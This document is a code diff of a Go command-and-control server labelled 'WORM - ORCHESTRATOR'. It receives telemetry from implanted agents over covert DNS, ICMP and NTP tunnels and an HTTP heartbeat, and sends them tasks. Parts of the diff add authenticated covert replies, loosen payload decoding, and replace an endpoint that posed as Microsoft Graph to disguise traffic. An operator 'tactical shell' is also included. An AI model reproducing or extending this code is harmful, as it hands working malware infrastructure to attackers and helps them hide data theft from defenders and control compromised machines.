@@ -52,7 +52,7 @@ func RenderVaporBanner() {
   | |/ |/ / /_/ / /_/ / / / / / /                
   |__/|__/\____/_/ .__/_/ /_/ /_/                 
                 /_/                              
-    W O R M  -  O R C H E S T R A T O R`)
+     W O R M  -  O R C H E S T R A T O R`)
 
 	pterm.Println(pterm.Cyan("────────────────────────────────────────────────────────────"))
 
@@ -117,7 +117,7 @@ func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 			if decoded != nil {
 				var t Telemetry
 				if err := json.Unmarshal(decoded, &t); err == nil {
-					LogHeartbeat("DNS", t)
+					LogHeartbeat("DNS (Tier 6)", t)
 					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
 					msg.Answer = append(msg.Answer, rr)
 				}
@@ -145,15 +145,12 @@ func StartIcmpListener() {
 		rb := make([]byte, 1500)
 		n, peer, _ := conn.ReadFrom(rb)
 		
-		// Maintain your ingress feedback
-		fmt.Printf("\n[!] ICMP INGRESS: %d bytes from %s\n", n, peer)
-
 		msg, _ := icmp.ParseMessage(1, rb[:n])
-		if msg.Type == ipv4.ICMPTypeEcho {
+		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
 			// Process Telemetry Payload
 			body, _ := msg.Body.Marshal(1)
 			if len(body) > 4 {
-				processRawPayload(body[4:], peer.String(), "ICMP")
+				processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)")
 			}
 
 			// Construct Authenticated Reply
@@ -168,9 +165,6 @@ func StartIcmpListener() {
 			}
 			mb, _ := reply.Marshal(nil)
 			conn.WriteTo(mb, peer)
-			
-			// Maintain your egress feedback
-			fmt.Println("[+] Sent HYDRA_ACK")
 		}
 	}
 }
@@ -187,10 +181,16 @@ func StartNtpListener() {
 	
 	for {
 		buf := make([]byte, 1500)
-		n, addr, _ := conn.ReadFromUDP(buf)
+		n, remoteAddr, _ := conn.ReadFromUDP(buf)
 		if n >= 48 {
-			// Extract telemetry from trailing bytes or timestamp fields
-			processRawPayload(buf[40:n], addr.String(), "NTP")
+			// Extract telemetry payload embedded after the 48-byte NTP header
+			processRawPayload(buf[48:n], remoteAddr.String(), "NTP (Tier 5)")
+
+			// AUTHENTICATED RESPONSE: Send T-ACK signature required by Agent
+			response := make([]byte, 48+5)
+			copy(response[0:48], buf[0:48]) // Echo NTP header
+			copy(response[48:], []byte("T-ACK"))
+			conn.WriteToUDP(response, remoteAddr)
 		}
 	}
 }
@@ -199,7 +199,11 @@ func StartNtpListener() {
 func processRawPayload(data []byte, peer string, tier string) {
 	rawStr := strings.ReplaceAll(string(data), ".", "")
 	decoded, err := base64.RawURLEncoding.DecodeString(rawStr)
-	if err != nil { return }
+	if err != nil {
+		// Try standard decoding if raw fails
+		decoded, err = base64.StdEncoding.DecodeString(rawStr)
+		if err != nil { return }
+	}
 
 	var t Telemetry
 	if err := json.Unmarshal(decoded, &t); err == nil {
@@ -215,57 +219,38 @@ func main() {
 	r := gin.New() 
 	r.Use(gin.Recovery())
 
-	// 2. Tier 1: Microsoft Graph (Cloud) Webhook Mock
-	r.POST("/v1.0/me/drive/root/children", func(c *gin.Context) {
-		var telemetry Telemetry
-		if err := c.ShouldBindJSON(&telemetry); err == nil {
-			LogHeartbeat("CLOUD", telemetry)
-			c.JSON(201, gin.H{
-				"@odata.context": "https://graph.microsoft.com/v1.0/$metadata#items",
-				"id":              "01ABC-HYDRA-V1",
+	// 2. TIER 1: Unified Cloud-Mock Responder [FIXED]
+	// This matches the Agent's expected internal lab URL and Auth header
+	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
+		auth := c.GetHeader("Authorization")
+		if auth != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
+			c.JSON(401, gin.H{"error": "Unauthorized"})
+			return
+		}
+		
+		var t Telemetry
+		if err := c.ShouldBindJSON(&t); err == nil {
+			LogHeartbeat("CLOUD (Tier 1)", t)
+			c.JSON(200, gin.H{
+				"status": "cloud_verified",
+				"task":   "WAIT",
+				"epoch":  time.Now().Unix(),
 			})
 		}
 	})
-	
-// --- TIER 1: Microsoft Graph (Cloud) Mock ---
-    // This simulates the Agent talking to a legitimate Microsoft API
-    r.POST("/v1.0/me/drive/root/children", func(c *gin.Context) {
-        var telemetry Telemetry
-        if err := c.ShouldBindJSON(&telemetry); err == nil {
-            LogHeartbeat("CLOUD (Tier 1)", telemetry)
-            c.JSON(http.StatusCreated, gin.H{
-                "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#items",
-                "id":              "01ABC-HYDRA-V1",
-            })
-        }
-    })
 
-    r.GET("/v1.0/me/messages", func(c *gin.Context) {
-        c.JSON(http.StatusOK, gin.H{
-            "value": []interface{}{
-                gin.H{
-                    "subject": "Mission Update",
-                    "body": gin.H{
-                        "content": "{\"status\":\"ok\",\"task\":\"SLEEP\",\"epoch\":1705920000}",
-                    },
-                },
-            },
-        })
-    })
-
-    // --- TIER 2: Malleable HTTP Heartbeat ---
-    // This matches the Agent's: http://localhost:8080/api/v1/heartbeat
-    r.POST("/api/v1/heartbeat", func(c *gin.Context) {
-        var telemetry Telemetry
-        if err := c.ShouldBindJSON(&telemetry); err == nil {
-            LogHeartbeat("MALLEABLE-HTTP (Tier 2)", telemetry)
-            c.JSON(http.StatusOK, gin.H{
-                "status": "ok",
-                "task":   "NOP",
-                "epoch":  time.Now().Unix(),
-            })
-        }
-    })
+	// 3. TIER 2: Malleable HTTP Heartbeat
+	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
+		var t Telemetry
+		if err := c.ShouldBindJSON(&t); err == nil {
+			LogHeartbeat("HTTPS (Tier 2)", t)
+			c.JSON(http.StatusOK, gin.H{
+				"status": "ok",
+				"task":   "NOP",
+				"epoch":  time.Now().Unix(),
+			})
+		}
+	})
 
 	// 4. Start Full-Spectrum Background Listeners
 	go StartIcmpListener() 
@@ -279,7 +264,7 @@ func main() {
 		}
 	}()
 
-	// 6. Interactive Tactical Shell with Auto-Completion
+	// 6. Interactive Tactical Shell
 	completer := readline.NewPrefixCompleter(
 		readline.PcItem("agents"),
 		readline.PcItem("tasks"),
